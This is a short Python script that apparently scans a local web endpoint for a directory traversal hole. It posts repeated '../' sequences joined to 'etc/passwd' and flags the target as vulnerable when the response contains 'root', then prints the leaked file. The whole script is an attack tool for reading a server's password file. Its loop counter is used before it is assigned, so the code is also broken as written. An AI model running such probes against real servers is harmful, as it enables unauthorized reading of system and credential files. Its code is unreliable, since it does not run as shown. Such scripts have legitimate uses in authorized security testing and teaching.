# -*- coding:utf-8 -*-
import requests

url = "http://127.0.0.1/local"
payloads = {
    'etc/passwd': 'root'
}
up = '../'

for payload, content in payloads.items():
    while i < 7:
        req = requests.post(url + (i * up) + payload)
        if content in req.text:
            print("Parameter vulnerable\r\n")
            print("Attack string: " + (i * up) + payload + "\r\n")
            print(req.text)
            break
        i = i + 1
    i = 0
